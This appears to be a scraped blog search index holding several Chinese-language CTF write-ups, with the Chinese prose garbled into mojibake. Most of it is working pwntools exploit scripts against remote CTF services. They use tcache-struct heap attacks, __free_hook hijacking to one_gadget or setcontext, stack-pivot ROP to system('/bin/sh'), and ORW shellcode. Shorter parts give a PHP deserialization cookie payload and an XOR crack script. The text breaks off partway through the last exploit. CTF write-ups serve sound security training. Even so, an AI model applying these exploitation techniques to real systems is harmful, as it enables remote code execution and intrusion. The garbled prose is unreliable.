&lt;h4 id=&#34;missing_php&#34;&gt;missing_php&lt;/h4&gt;
&lt;p&gt;ËøôÈ¢ò‰∏äÊâ´Êèè  Êâ´Âá∫/.index.php.swpËøô‰∏™ÁõÆÂΩï&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1686466863431.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;ÁÑ∂ÂêéÁõ¥Êé•ËÆøÈóÆ  /fl4444444gÂ∞±Âá∫flag‰∫Ü&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1686466869831.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h4 id=&#34;Â∫èÂàóÂåñ&#34;&gt;Â∫èÂàóÂåñ&lt;/h4&gt;
&lt;p&gt;Ê∫êÁ†ÅÈáåÈù¢Êúâ‰∏Ä‰∏™Ëøô‰∏™&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1686466879636.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;ÁÑ∂ÂêéÁî®BPÊäìÂåÖÂèëÁé∞cookieÈáåÈù¢Êúâ‰∏§‰∏™ÂÄº,ÊäälistËøõË°åurldecodeÂèëÁé∞‰º†ÂÖ•ÁöÑÂèÇÊï∞ÈÉΩË¢´ÂΩìÂÅöÊï∞ÁªÑÂ∫èÂàóÂåñ‰∫Ü&lt;/p&gt;
&lt;p&gt;ÁÑ∂ÂêéÊ†πÊçÆËøô‰∏™ÊûÑÈÄ†‰∏Ä‰∏™POCËÑöÊú¨&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
$a=[];
Class whatthefuck{
    public $source;
    public function __construct()
    {
        $this-&amp;gt;source = &amp;quot;flag.php&amp;quot;;
    }
	public function __toString()
	{
		return highlight_file($this-&amp;gt;source,true);
	}
}
$a[0]=new whatthefuck;
echo serialize($a);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÁÑ∂ÂêéË∑ëÂá∫payload(a:1:{i:0;O:11:&amp;quot;whatthefuck&amp;quot;:1:{s:6:&amp;quot;source&amp;quot;;s:8:&amp;quot;flag.php&amp;quot;;}})ËøõË°å‰∏ÄÊ¨°urlencodeÁºñÁ†Å,ÊîπcookieÁöÑlistÂÄºÂç≥ÂèØ&lt;/p&gt;
&lt;h2 id=&#34;reverse&#34;&gt;Reverse&lt;/h2&gt;
&lt;h3 id=&#34;easycrack&#34;&gt;easyCrack&lt;/h3&gt;
&lt;p&gt;Â∞ÜexeÊñá‰ª∂ËÑ±Êú∫ËÑ±Â£≥Êú∫Ôºå‰∏ÄÈîÆËÑ±Â£≥&lt;/p&gt;
&lt;p&gt;ÁÑ∂ÂêéÂ∞ÜËÑ±Â•ΩÁöÑexeËÑ±Êú∫idaÈáåÈù¢ÔºåÁÑ∂ÂêéÊâæÂà∞‰∏ªÂáΩÊï∞ÂèëÁé∞Âä†ÂØÜÈÄªËæë&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1686466895944.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;ÁÑ∂ÂêéÂú®str2ÊâæÂà∞ÂØÜÊñá&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;7&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1686466904748.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;ÁÑ∂ÂêéÂÜô‰∏Ä‰∏™ËÑöÊú¨Â∞±ok‰∫Ü&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;ans=&amp;quot;hboiuFk|kGocs&amp;quot;
flag=&amp;quot;&amp;quot;
for i in range(12,-1,-1):
    s=ord(ans[i])
    s^=14
    flag+=chr(s)
print(flag[::-1])
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;crpyto&#34;&gt;Crpyto&lt;/h3&gt;
&lt;h4 id=&#34;xor&#34;&gt;xor&lt;/h4&gt;
&lt;p&gt;ËøõË°å‰∏ÄÊ¨°base64Ëß£Á†ÅÔºåÁÑ∂ÂêéËøõË°å‰∫¶ÊàñÁàÜÁ†¥Áõ¥Êé•Âá∫flag‰∫Ü&lt;/p&gt;
">Â§©Ê¥•Â∏ÇÂ§ßÂ≠¶Áîü‰ø°ÊÅØÂÆâÂÖ®ÁΩëÁªúÊîªÈò≤Â§ßËµõ„ÄêCTFËß£È¢òËµõ„Äë wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/jHcQ-mMeR/"" data-c="
          &lt;p&gt;ËøáÂéªÁöÑSWPUÁöÑÈ¢òÁõÆÊê¨Âá∫Êù•ÂÅö‰∏Ä‰∏ã&lt;/p&gt;
&lt;h4 id=&#34;tnote&#34;&gt;tnote:&lt;/h4&gt;
&lt;p&gt;off by oneÂ†ÜÈáçÂè†Ê≥ÑÈú≤Â†ÜÂú∞ÂùÄ&lt;br&gt;
ÁÑ∂ÂêéÂä´ÊåÅÂà∞tcache structÔºàheap_base+0x10Â§Ñ‰øÆÊîπcountsÊ≥ÑÈú≤libcÁÑ∂ÂêéÊ≠£Â∏∏Êâìfree_hook&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node2.anna.nssctf.cn&amp;quot;,28240)
# io=process(&amp;quot;./service&amp;quot;)
elf=ELF(&amp;quot;./service&amp;quot;)
libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)

def add(s):
    io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;A&amp;quot;)
    io.sendlineafter(b&amp;quot;size?&amp;quot;,str(s))
    
def edit(n,cc):
    io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;E&amp;quot;)
    io.sendlineafter(b&amp;quot;idx?&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;content:&amp;quot;,cc)
    
def show(n):
    io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;S&amp;quot;)
    io.sendlineafter(b&amp;quot;idx?&amp;quot;,str(n))
    
def delete(n):
    io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;D&amp;quot;)
    io.sendlineafter(b&amp;quot;idx?&amp;quot;,str(n))

# gdb.attach(io)
# pause()

add(0x18) #0
add(0x18) #1
add(0x78) #2
add(0x10) #3

edit(0,cyclic(0x18)+p64(0x61))
delete(1)   
delete(2)
# edit(0,cyclic(0x18)+p64(0x81))
add(0x50) #1 #‰∏ãÊ†áÂ§çÁî®ÔºåÊåâÁÖßdeleteÈ°∫Â∫èÂ§çÁî®
edit(1,b&amp;quot;a&amp;quot;*0x27+b&amp;quot;b&amp;quot;)
show(1)
io.recvuntil(b&amp;quot;b&amp;quot;)
heap_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))-0x10 #Ê≥ÑÈú≤Â†ÜÂú∞ÂùÄ
print(&amp;quot;heap_addr: &amp;quot;+hex(heap_addr))

edit(1,b&amp;quot;a&amp;quot;*0x18+p64(0x81)+p64(heap_addr+0x10)+p64(0))
add(0x78) #2
add(0x78) #4
edit(4,b&amp;quot;\x07&amp;quot;*0x40+p64(0)*6+p64(heap_addr+0x10))
delete(4)
add(0x78) #4
show(4)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x70-libc.sym[b&amp;quot;__malloc_hook&amp;quot;] #Ê≥ÑÈú≤libcÂú∞ÂùÄ
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
one_gadget=[0x4f3d5,0x4f432,0x10a41c]
shell=leak_addr+one_gadget[1]

edit(4,b&amp;quot;\x02&amp;quot;*0x40+p64(0)*3+p64(free_hook))
add(0x40) #5  
edit(5,p64(shell)) #Âä´ÊåÅfree_hookÊâìone_gadget

delete(5) #trigger

io.interactive()

# 0x4f3d5 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL

# 0x4f432 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a41c execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;p1kkheap&#34;&gt;p1KkHeap:&lt;/h4&gt;
&lt;p&gt;ÂºÄÂêØÊ≤ôÁõíÁ¶ÅÁî®&lt;code&gt;execve()&lt;/code&gt;&lt;br&gt;
mmapÂºÄËæürwxÊÆµ&lt;br&gt;
Âä´ÊåÅhookÂà∞rwxÊÆµ‰∏äÂú∞ÂùÄÊâìorw shellcodeÂç≥ÂèØ&lt;br&gt;
ÂêåÊ†∑ÈúÄË¶ÅÊâìtcache structÔºåÊ≥®ÊÑèÊûÑÈÄ†tcachebinÁöÑÂ§ßÂ∞è&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node1.anna.nssctf.cn&amp;quot;,28176)
# io=process(&amp;quot;./SWPUCTF_2019_p1KkHeap&amp;quot;)
elf=ELF(&amp;quot;./SWPUCTF_2019_p1KkHeap&amp;quot;)
libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)

def add(s):
    io.sendlineafter(b&amp;quot;Choice: &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;size: &amp;quot;,str(s))

def show(n):
    io.sendlineafter(b&amp;quot;Choice: &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;id: &amp;quot;,str(n))
    
def edit(n,cc):
    io.sendlineafter(b&amp;quot;Choice: &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;id: &amp;quot;,str(n))
    io.sendafter(b&amp;quot;content: &amp;quot;,cc)

def delete(n):
    io.sendlineafter(b&amp;quot;Choice: &amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;id: &amp;quot;,str(n))
    
# gdb.attach(io)
# pause()

mm_addr=0x66660100

add(0x100) #0
add(0x100) #1
delete(0)
delete(0)
show(0)
io.recvuntil(b&amp;quot;content: &amp;quot;)
heap_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))-0x260
print(&amp;quot;heap_addr: &amp;quot;+hex(heap_addr))

add(0x100) #2
edit(2,p64(heap_addr+0x10)) 
add(0x100) #3
add(0x100) #4
edit(4,b&amp;quot;\x07&amp;quot;*0x40)
delete(0)
show(0)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x70-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
orw_shellcode=asm(shellcraft.open(&amp;quot;/flag&amp;quot;)+shellcraft.read(3,mm_addr+0x400,0x50)+shellcraft.write(1,mm_addr+0x400,0x50))

edit(4,b&amp;quot;\x07&amp;quot;*0x40+p64(0)*6+p64(malloc_hook)+p64(0)+p64(mm_addr))
add(0x90) #5
edit(5,orw_shellcode)
add(0x70) #6
edit(6,p64(mm_addr))

add(0x30)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;wheretogo&#34;&gt;WheretoGoÔºö&lt;/h4&gt;
&lt;p&gt;‰∏ÄÊ¨°Ê∫¢Âá∫ÁöÑÊ†àËøÅÁßªÊ®°ÊùøÈ¢òÔºå‰∏çËøáÂõ†‰∏∫ÁéØÂ¢ÉÈóÆÈ¢òÊúÄÂêéÂæóËøÅ2Ê¨°&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node2.anna.nssctf.cn&amp;quot;,28972)
# io=process(&amp;quot;./WheretoGo&amp;quot;)
elf=ELF(&amp;quot;./WheretoGo&amp;quot;)
libc=ELF(&amp;quot;./libc-2.31.so&amp;quot;)

puts_plt=elf.plt[b&amp;quot;puts&amp;quot;]
puts_got=elf.got[b&amp;quot;puts&amp;quot;]
bk_addr=0x4011bd
bss_addr=0x404d00
read_text=0x4011C9
leave_ret=0x4011e0
pop_rdi=0x4012d3

io.recvuntil(b&amp;quot;go?\n&amp;quot;)
payload=cyclic(0x80)+p64(bss_addr)+p64(read_text)
payload=payload.ljust(0x100,b&amp;quot;a&amp;quot;)
io.send(payload)

payload=p64(0)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(bk_addr)
payload=payload.ljust(0x80,b&amp;quot;\x00&amp;quot;)+p64(bss_addr-0x80)+p64(leave_ret)
payload=payload.ljust(0x100,b&amp;quot;a&amp;quot;)
io.send(payload)

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_bin_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))


payload=cyclic(0x80)+p64(bss_addr-0x200-0x8)+p64(read_text)
payload=payload.ljust(0x100,b&amp;quot;a&amp;quot;)
io.send(payload)

# gdb.attach(io)
# pause()

payload=p64(0)+p64(pop_rdi)+p64(str_bin_sh)+p64(sys_addr)
payload=payload.ljust(0x80,b&amp;quot;\x00&amp;quot;)+p64(bss_addr-0x280-0x8)+p64(leave_ret)
payload=payload.ljust(0x100,b&amp;quot;a&amp;quot;)
io.send(payload)


# payload=cyclic(0x88)+p64(pop_rdi)+p64(str_bin_sh)+p64(sys_addr)
# io.send(payload)


io.interactive()

# Gadgets information
# ============================================================
# 0x00000000004011e0 : leave ; ret
# 0x00000000004012cc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004012ce : pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004012d0 : pop r14 ; pop r15 ; ret
# 0x00000000004012d2 : pop r15 ; ret
# 0x00000000004012cb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004012cf : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040115d : pop rbp ; ret
# 0x00000000004012d3 : pop rdi ; ret
# 0x00000000004012d1 : pop rsi ; pop r15 ; ret
# 0x00000000004012cd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret

# Unique gadgets found: 12
&lt;/code&gt;&lt;/pre&gt;
">SWPU ÈÉ®ÂàÜwp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/qmbh8mgFo/"" data-c="
          &lt;h4 id=&#34;silverwolf&#34;&gt;&lt;strong&gt;silverwolf:&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;glibc 2.27-3ubuntu1.4Ôºå&lt;code&gt;Â†Ü‰∏äorw&lt;/code&gt;+&lt;code&gt;tcache struct attack&lt;/code&gt;&lt;br&gt;
Êú¨È¢òÂÆûÈôÖ‰∏äÂè™ËÉΩÊéßÂà∂index‰∏∫0ÁöÑÂ†ÜÂùóÔºå‰∏îÊØèÊ¨°ÂàõÂª∫Â†ÜÂùóÊúÄÂ§ß‰∏çË∂ÖËøá0x78ÔºåÂ≠òÂú®UAFÔºåÂºÄÂêØÊ≤ôÁõí‰øùÊä§ÔºåÂè™ÊúâÊâìorw&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1686106761807.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ÂèØ‰ª•ÈÄöËøá&lt;code&gt;tcache double free&lt;/code&gt;Ê≥ÑÈú≤Â†ÜÂú∞ÂùÄÔºåÊ≠§ÁâàÊú¨Âä†ÂÖ•Ê£ÄÊµãÔºåÂèØ‰ª•ÈÄöËøáË¶ÜÁõñ&lt;code&gt;tcache bk&lt;/code&gt;‰∏∫0ÁªïËøá&lt;br&gt;
Ê≥ÑÈú≤libcÂü∫ÂùÄÂèØ‰ª•Êâì&lt;code&gt;tcache struct&lt;/code&gt;ÔºåÊéßÂà∂Â†ÜÂùóÂà∞&lt;code&gt;heap_base+0x10&lt;/code&gt;Â§Ñ‰øÆÊîπ&lt;code&gt;tcachebin counts&lt;/code&gt;‰∏∫‰∏çÂ∞è‰∫é7ÁöÑÊï∞ÔºåÂêéÁª≠ÂÜçÊ¨°ÈáäÊîæÊó∂ËøõÂÖ•&lt;code&gt;unsortedbin&lt;/code&gt;Ê≥ÑÈú≤Âú∞ÂùÄ&lt;br&gt;
‰πãÂêé‰øÆÊîπ&lt;code&gt;tcache struct&lt;/code&gt;ÁªìÊûÑÔºåÂä´ÊåÅ&lt;code&gt;free_hook&lt;/code&gt;Âà∞&lt;code&gt;setcontext+53&lt;/code&gt;Â§ÑÔºåÂêéÁª≠&lt;code&gt;delete&lt;/code&gt;Êó∂Ë∞ÉÁî®&lt;code&gt;free_hook&lt;/code&gt;Êåá‰ª§Ë∑≥ËΩ¨Âà∞&lt;code&gt;setcontext+53&lt;/code&gt;Â§Ñ,Ê≠§Â§ÑÊåá‰ª§‰∏∫&lt;code&gt;mov  rsp, [rdi+0A0h]&lt;/code&gt;,‰ºöÂ∞ÜrspÁöÑÂÄºË¶ÜÁõñ‰∏∫&lt;code&gt;[rdi+0xa0]&lt;/code&gt;ÁöÑÂÄºÔºåËÄåÊ≠§Â§ÑÊ≠£ÊòØÊàë‰ª¨Â∞ÜË¶ÅÂ∏ÉÁΩÆÁöÑ&lt;code&gt;p64(heap_addr+0x4000)+p64(ret)&lt;/code&gt;ÔºåÂ∞ÜË¶ÅÂä´ÊåÅrspÂà∞Êàë‰ª¨Ë¶ÅÂÜôÂÖ•orw ropÈìæÁöÑÂú∞Êñπ&lt;br&gt;
ÊûÑÈÄ†orw ropÈìæÔºåÊ≠§È¢òopenÈúÄË¶Å‰ΩøÁî®syscall&lt;s&gt;Èò≤Ê≠¢Á†¥ÂùèÊ†àÁªìÊûÑ&lt;/s&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#open
orw=p64(pop_rdi)+p64(flag_addr)+p64(pop_rsi)+p64(0)+p64(pop_rax)+p64(2)+p64(syscall)
#read
orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(heap_addr+0x5000)+p64(pop_rdx)+p64(0x50)+p64(read_addr)
#write
orw+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(heap_addr+0x5000)+p64(pop_rdx)+p64(0x50)+p64(write_addr)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Êú¨È¢òÁî±‰∫éÂ†ÜÂùóÂ§ßÂ∞èÈôêÂà∂ÔºåÊó†Ê≥ï‰∏ÄÊ¨°ÊÄßÂ∞ÜorwÁöÑropÈìæÂÜôÂÖ•Â†ÜÂùóÔºå‰∫éÊòØÂàÜ‰∏§Ê¨°ÂÜôÂÖ•ÔºåÊ≥®ÊÑèÊéßÂà∂ÂÜôÂÖ•Â†ÜÂùó‰πãÈó¥ÁöÑË∑ùÁ¶ª‰∏∫ÂçïÊ¨°ÂÜôÂÖ•ÈïøÂ∫¶&lt;br&gt;
Âè¶Â§ñÊ≥®ÊÑèsyscallÁöÑÂÅèÁßªÔºåÁî®ROPgadgetÊâæÂà∞ÁöÑÊâì‰∏çÈÄöÔºåÁî®ropperÊâæËÉΩÊâìÈÄö&lt;/p&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28802)
io=process(&amp;quot;./silverwolf&amp;quot;)
elf=ELF(&amp;quot;./silverwolf&amp;quot;)
libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)

def add(s):
    io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,b&amp;quot;0&amp;quot;)
    io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(s))
    
def edit(cc):
    io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,b&amp;quot;0&amp;quot;)
    io.sendlineafter(b&amp;quot;Content: &amp;quot;,cc)

def show(n):
    io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
def delete(n):
    io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))

def rst():
    for i in range(12):
        add(0x10)
    for i in range(11):
        add(0x60)
    for i in range(7):
        add(0x70)
    add(0x50)
    

rst()  #ÂºÄÂêØseccompÂêéÂ†ÜÈ£éÊ∞¥‰π±ÊéâÔºåÂ∞ΩÂèØËÉΩÊÅ¢Â§ç
add(0x78)
delete(0)
edit(p64(0)*2) #ÁªïËøátcache double freeÊ£ÄÊµã
delete(0)
show(0)  #Ê≥ÑÈú≤Â†ÜÂú∞ÂùÄÔºå‰∏∫ÂêéÁª≠Â†Ü‰∏äropÂÅöÂáÜÂ§á
io.recvuntil(b&amp;quot;Content: &amp;quot;)
heap_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))-0x1920
print(&amp;quot;heap_addr: &amp;quot;+hex(heap_addr))
edit(p64(heap_addr+0x10))
add(0x78)  
add(0x78)  #Áî≥ËØ∑Âà∞heap_addr+0x10Â§Ñ‰øÆÊîπcounts
edit(p64(0)*0x4+p64(0x7000000)+p64(0)*3) #tcache struct attack

delete(0)
show(0)  #Ê≥ÑÈú≤libc
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x70-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
malloc_hook=libc.sym[b&amp;quot;__malloc_hook&amp;quot;]+leak_addr
free_hook=libc.sym[b&amp;quot;__free_hook&amp;quot;]+leak_addr
setcontext=libc.sym[b&amp;quot;setcontext&amp;quot;]+leak_addr+53 #mov rsp,[rdi+0A0h]
sys_addr=libc.sym[b&amp;quot;system&amp;quot;]+leak_addr
open_addr=libc.sym[b&amp;quot;open&amp;quot;]+leak_addr
read_addr=libc.sym[b&amp;quot;read&amp;quot;]+leak_addr
write_addr=libc.sym[b&amp;quot;write&amp;quot;]+leak_addr
flag_addr=heap_addr+0x1000

#gadgets
pop_rdi=0x215bf+leak_addr
pop_rsi=0x23eea+leak_addr
pop_rdx=0x01b96+leak_addr
pop_rcx=0x34da3+leak_addr
pop_rax=0x43ae8+leak_addr 
pop_rsp=0x03960+leak_addr
syscall=0xd2745+leak_addr 
ret=0x08aa+leak_addr

# edit((p64(0)+p64(1))*4)


payload=b&amp;quot;\x02&amp;quot;*0x40+p64(free_hook) #ÂØπÂ∫îtcachebin Â§ßÂ∞è 0x18
payload+=p64(0) #0x28
payload+=p64(heap_addr+0x1000) #flag   0x38 flagÂ≠óÁ¨¶‰∏≤Âú∞ÂùÄ
payload+=p64(heap_addr+0x2000) #stack   0x48  ÊúÄÂêédeleteËß¶Âèëfree_hookÁöÑtcachebin
payload+=p64(heap_addr+0x20a0) #stack   0x58 ÂÜôÂÖ•ËøÅÁßªÂà∞orw ropÁöÑtcachebinÂ§Ñ
payload+=p64(heap_addr+0x4000) #orw rop  0x68 
payload+=p64(heap_addr+0x4068) #orw rop  0x78
edit(payload)


#open
orw=p64(pop_rdi)+p64(flag_addr)+p64(pop_rsi)+p64(0)+p64(pop_rax)+p64(2)+p64(syscall)
#read
orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(heap_addr+0x5000)+p64(pop_rdx)+p64(0x50)+p64(read_addr)
#write
orw+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(heap_addr+0x5000)+p64(pop_rdx)+p64(0x50)+p64(write_addr)


gdb.attach(io)
pause()


add(0x18)
edit(p64(setcontext)) #Â∞Üfree_hookÊåáÂêësetcontext+0x53Â§ÑÔºåÈÅøÂºÄfldenvÊåá‰ª§

add(0x38)
edit(b&amp;quot;./flag&amp;quot;)

add(0x68)
edit(orw[:0x68])

add(0x78)
edit(orw[0x68:])

add(0x58)
edit(p64(heap_addr+0x4000)+p64(ret))

add(0x48)
delete(0)

# add(0x58)
# add(0x48)
# delete(n)
# payload+=
# add(0x40)
# for i in range(4):
#     add(0x10)
# edit(b&amp;quot;flag\x00\x00\x00&amp;quot;)

# edit(p64(0)*8)
# edit(p64(free_hook))
# add(0x10)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h4 id=&#34;lonelywolf&#34;&gt;&lt;strong&gt;lonelywolf:&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;‰∏ä‰∏ÄÈ¢òÁöÑÂº±ÂåñÁâàÔºåÊ≤°ÊúâseccompÔºåtcachebinÂíåfastbinÁªìÊûÑÊ≠£Â∏∏&lt;br&gt;
ÁªïËøáÊ£ÄÊµãdouble freeÂêéÊ≥ÑÈú≤Â†ÜÂú∞ÂùÄÊâì&lt;code&gt;tcachebin struct&lt;/code&gt;Ê≥ÑÈú≤libcÂú∞ÂùÄ&lt;br&gt;
‰πãÂêé‰øÆÊîπ&lt;code&gt;tcache struct&lt;/code&gt;ÂêéÂä´ÊåÅ&lt;code&gt;free_hook&lt;/code&gt;Êâì&lt;code&gt;one_gadget&lt;/code&gt;Âç≥ÂèØ&lt;/p&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28287)
# io=process(&amp;quot;./lonelywolf&amp;quot;)
elf=ELF(&amp;quot;./lonelywolf&amp;quot;)
libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)

def add(n,s):
    io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(s))
    
def edit(n,cc):
    io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;Content: &amp;quot;,cc)

def show(n):
    io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
def delete(n):
    io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
# gdb.attach(io)
# pause()

add(0,0x78)
delete(0)
edit(0,p64(0)*2)
delete(0)
show(0)

io.recvuntil(b&amp;quot;Content: &amp;quot;)
heap_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))-0x260
print(&amp;quot;heap_addr: &amp;quot;+hex(heap_addr))

edit(0,p64(heap_addr+0x10))
add(0,0x78)
add(0,0x78)
edit(0,b&amp;quot;\x07&amp;quot;*0x40)

delete(0)
show(0)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x70-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

malloc_hook=libc.sym[b&amp;quot;__malloc_hook&amp;quot;]+leak_addr
free_hook=libc.sym[b&amp;quot;__free_hook&amp;quot;]+leak_addr
